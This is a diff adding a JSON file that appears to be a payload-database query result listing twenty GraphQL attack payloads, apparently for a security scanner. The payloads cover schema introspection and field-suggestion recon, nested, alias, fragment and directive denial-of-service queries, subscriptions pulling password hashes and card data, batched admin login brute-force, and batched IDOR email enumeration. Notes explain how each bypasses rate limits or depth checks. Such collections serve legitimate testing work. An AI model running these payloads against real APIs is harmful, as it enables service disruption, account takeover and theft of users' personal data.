@@ -1,0 +1,376 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "graphql"
+  },
+  "count": 20,
+  "results": [
+    {
+      "id": "1674114132538eb4",
+      "payload": "{__schema{directives{name description locations args{name type{name kind ofType{name kind}}}}}}",
+      "technique": "introspection",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 1,
+      "placeholders": [],
+      "notes": "Introspection of custom directives. Reveals server-side logic hints such as @auth, @deprecated, @cacheControl.",
+      "source": "ensphere",
+      "tags": [
+        "directives",
+        "introspection",
+        "recon"
+      ]
+    },
+    {
+      "id": "16ac91e070e7588e",
+      "payload": "{passwor}",
+      "technique": "field_suggestion",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "error",
+      "risk": 1,
+      "placeholders": [],
+      "notes": "Typo probe for password-related fields. May trigger suggestions like 'password', 'passwordHash', 'passwordReset'.",
+      "source": "ensphere",
+      "tags": [
+        "field_suggestion",
+        "password",
+        "recon",
+        "typo"
+      ]
+    },
+    {
+      "id": "18ee0b3b10b94c28",
+      "payload": "{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}",
+      "technique": "introspection",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 1,
+      "placeholders": [],
+      "notes": "Full introspection query. Returns all types, fields, and nested type info. Exposes entire API surface.",
+      "source": "ensphere",
+      "tags": [
+        "enumeration",
+        "introspection",
+        "recon",
+        "schema"
+      ]
+    },
+    {
+      "id": "2b167c48dd60bb1b",
+      "payload": "{usre{id}}",
+      "technique": "field_suggestion",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "error",
+      "risk": 1,
+      "placeholders": [],
+      "notes": "Intentional typo 'usre' to trigger field suggestion. Server may respond with 'Did you mean user?' leaking valid field names even with introspection disabled.",
+      "source": "ensphere",
+      "tags": [
+        "enumeration",
+        "field_suggestion",
+        "recon",
+        "typo"
+      ]
+    },
+    {
+      "id": "84e15700dae88cb6",
+      "payload": "{__typename}",
+      "technique": "introspection",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 1,
+      "placeholders": [],
+      "notes": "Minimal __typename probe. Confirms endpoint is GraphQL if it returns Query/Mutation. Works even when introspection is disabled.",
+      "source": "ensphere",
+      "tags": [
+        "fingerprint",
+        "introspection",
+        "probe",
+        "typename"
+      ]
+    },
+    {
+      "id": "8cb3bbc967675ae1",
+      "payload": "{__type(name:\"Mutation\"){name fields{name args{name type{name kind ofType{name}}}}}}",
+      "technique": "introspection",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 1,
+      "placeholders": [],
+      "notes": "Introspect the Mutation root type. Lists all available mutations and their argument signatures.",
+      "source": "ensphere",
+      "tags": [
+        "enumeration",
+        "introspection",
+        "mutation",
+        "recon"
+      ]
+    },
+    {
+      "id": "ac6f5f5dd44562ab",
+      "payload": "{__type(name:\"User\"){name fields{name type{name kind ofType{name}}}}}",
+      "technique": "introspection",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 1,
+      "placeholders": [],
+      "notes": "Targeted __type query for User type. Enumerates fields like email, password, role without full schema dump.",
+      "source": "ensphere",
+      "tags": [
+        "introspection",
+        "recon",
+        "type",
+        "user"
+      ]
+    },
+    {
+      "id": "ba1b6ba5eae79b1e",
+      "payload": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{name kind description fields(includeDeprecated:true){name description args{name type{name kind ofType{name kind}}}}enumValues(includeDeprecated:true){name}inputFields{name type{name kind ofType{name kind}}}possibleTypes{name}}}}",
+      "technique": "introspection",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 1,
+      "placeholders": [],
+      "notes": "Comprehensive introspection query covering query/mutation/subscription root types, deprecated fields, enum values, input fields, and union/interface possible types.",
+      "source": "ensphere",
+      "tags": [
+        "enumeration",
+        "full",
+        "introspection",
+        "recon",
+        "schema"
+      ]
+    },
+    {
+      "id": "f75ddfbfa6a6f0e3",
+      "payload": "{admi{id}}",
+      "technique": "field_suggestion",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "error",
+      "risk": 1,
+      "placeholders": [],
+      "notes": "Typo probe targeting admin-related types. May reveal 'admin', 'adminUser', 'adminSettings' via suggestions.",
+      "source": "ensphere",
+      "tags": [
+        "admin",
+        "field_suggestion",
+        "recon",
+        "typo"
+      ]
+    },
+    {
+      "id": "548708da3ca03484",
+      "payload": "{users(first:10000){edges{node{id email posts(first:10000){edges{node{title comments(first:10000){edges{node{body}}}}}}}}}}}",
+      "technique": "nested_query_dos",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Pagination abuse with maximum first argument at every level. Bypasses depth limits by staying shallow while requesting enormous result sets.",
+      "source": "ensphere",
+      "tags": [
+        "complexity",
+        "dos",
+        "pagination",
+        "resource_exhaustion"
+      ]
+    },
+    {
+      "id": "8aefc6302f68a7e1",
+      "payload": "subscription{onOrderPlaced{id total customer{email creditCard{last4}}}}",
+      "technique": "nested_query_dos",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Subscribe to order events requesting nested PII. Tests whether subscription resolvers enforce field-level authorization.",
+      "source": "ensphere",
+      "tags": [
+        "auth_bypass",
+        "idor",
+        "pii",
+        "subscription"
+      ]
+    },
+    {
+      "id": "96dab057635be174",
+      "payload": "{user(id:1){name @aa @ab @ac @ad @ae @af @ag @ah @ai @aj @ak @al @am @an @ao @ap @aq @ar @as @at @au @av @aw @ax @ay @az @ba @bb @bc @bd @be @bf @bg @bh @bi @bj @bk @bl @bm @bn @bo @bp @bq @br @bs @bt @bu @bv @bw @bx}}",
+      "technique": "nested_query_dos",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "50 directives on a single field. Some GraphQL implementations process each directive sequentially, causing CPU exhaustion or stack overflow.",
+      "source": "ensphere",
+      "tags": [
+        "directive",
+        "dos",
+        "overload",
+        "resource_exhaustion"
+      ]
+    },
+    {
+      "id": "99410027a751532c",
+      "payload": "subscription{onUserCreated{id email passwordHash role}}",
+      "technique": "nested_query_dos",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Subscribe to user creation events requesting sensitive fields. If subscription auth is weaker than query auth, may leak new user data in real-time.",
+      "source": "ensphere",
+      "tags": [
+        "auth_bypass",
+        "recon",
+        "sensitive_data",
+        "subscription"
+      ]
+    },
+    {
+      "id": "b7a6c5338fbb6a98",
+      "payload": "[{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"password1\\\"){token}}\"},{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"password2\\\"){token}}\"},{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"password3\\\"){token}}\"},{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"password4\\\"){token}}\"},{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"password5\\\"){token}}\"}]",
+      "technique": "batch_query",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Batched login mutations for credential brute-force. Sends 5 password attempts in a single HTTP request, bypassing per-request rate limiting.",
+      "source": "ensphere",
+      "tags": [
+        "auth",
+        "batch",
+        "brute_force",
+        "mutation",
+        "rate_limit_bypass"
+      ]
+    },
+    {
+      "id": "c048745a74cb2ee6",
+      "payload": "[{\"query\":\"{user(id:1){email}}\"},{\"query\":\"{user(id:2){email}}\"},{\"query\":\"{user(id:3){email}}\"},{\"query\":\"{user(id:4){email}}\"},{\"query\":\"{user(id:5){email}}\"},{\"query\":\"{user(id:6){email}}\"},{\"query\":\"{user(id:7){email}}\"},{\"query\":\"{user(id:8){email}}\"},{\"query\":\"{user(id:9){email}}\"},{\"query\":\"{user(id:10){email}}\"}]",
+      "technique": "batch_query",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Batched IDOR enumeration. Fetches 10 user emails in a single request. Bypasses per-request rate limits and may evade WAF.",
+      "source": "ensphere",
+      "tags": [
+        "batch",
+        "enumeration",
+        "idor",
+        "rate_limit_bypass"
+      ]
+    },
+    {
+      "id": "c10a776013345751",
+      "payload": "{a0:__typename a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename a6:__typename a7:__typename a8:__typename a9:__typename a10:__typename a11:__typename a12:__typename a13:__typename a14:__typename a15:__typename a16:__typename a17:__typename a18:__typename a19:__typename a20:__typename a21:__typename a22:__typename a23:__typename a24:__typename a25:__typename a26:__typename a27:__typename a28:__typename a29:__typename a30:__typename a31:__typename a32:__typename a33:__typename a34:__typename a35:__typename a36:__typename a37:__typename a38:__typename a39:__typename a40:__typename a41:__typename a42:__typename a43:__typename a44:__typename a45:__typename a46:__typename a47:__typename a48:__typename a49:__typename}",
+      "technique": "alias_dos",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "50 aliased __typename queries. Low-cost per-alias probe to test if the server enforces alias count limits before escalating to expensive resolvers.",
+      "source": "ensphere",
+      "tags": [
+        "alias",
+        "complexity",
+        "probe",
+        "recon",
+        "typename"
+      ]
+    },
+    {
+      "id": "ec31a6443d67dec7",
+      "payload": "query @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) {user(id:1){name}}",
+      "technique": "nested_query_dos",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "error",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Duplicate built-in @skip directives on the operation. Tests if the server validates or limits repeated directives.",
+      "source": "ensphere",
+      "tags": [
+        "directive",
+        "dos",
+        "duplicate",
+        "probe",
+        "skip"
+      ]
+    },
+    {
+      "id": "273e0cdc82ecab1f",
+      "payload": "{organization(id:1){members{organization{members{organization{members{organization{members{organization{members{organization{members{name}}}}}}}}}}}}}}",
+      "technique": "nested_query_dos",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Depth 12 nested query oscillating between organization and members. Exploits circular references in org/member graphs.",
+      "source": "ensphere",
+      "tags": [
+        "circular",
+        "depth",
+        "dos",
+        "nested",
+        "resource_exhaustion"
+      ]
+    },
+    {
+      "id": "49777c773099fe72",
+      "payload": "query{search(query:\"*\"){...on User{id email friends(first:1000){name}}...on Post{id title comments(first:1000){body}}...on File{id url size}}}",
+      "technique": "nested_query_dos",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Union type fan-out with inline fragments. Forces the resolver to execute across multiple backing services and return large result sets from each type.",
+      "source": "ensphere",
+      "tags": [
+        "complexity",
+        "dos",
+        "fan_out",
+        "resource_exhaustion",
+        "union"
+      ]
+    },
+    {
+      "id": "54a1ff96657ae8a3",
+      "payload": "query{user(id:1){...F1}}fragment F1 on User{friends{...F2}}fragment F2 on User{friends{...F3}}fragment F3 on User{friends{...F4}}fragment F4 on User{friends{...F5}}fragment F5 on User{friends{...F6}}fragment F6 on User{friends{...F7}}fragment F7 on User{friends{...F8}}fragment F8 on User{friends{...F9}}fragment F9 on User{friends{...F10}}fragment F10 on User{friends{name email}}",
+      "technique": "nested_query_dos",
+      "injection_surface": "graphql_query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "10 chained named fragments creating depth 10+ query. Bypasses simple depth checks that only inspect the query AST without resolving fragment spreads.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "depth",
+        "dos",
+        "fragment",
+        "resource_exhaustion"
+      ]
+    }
+  ]
+}
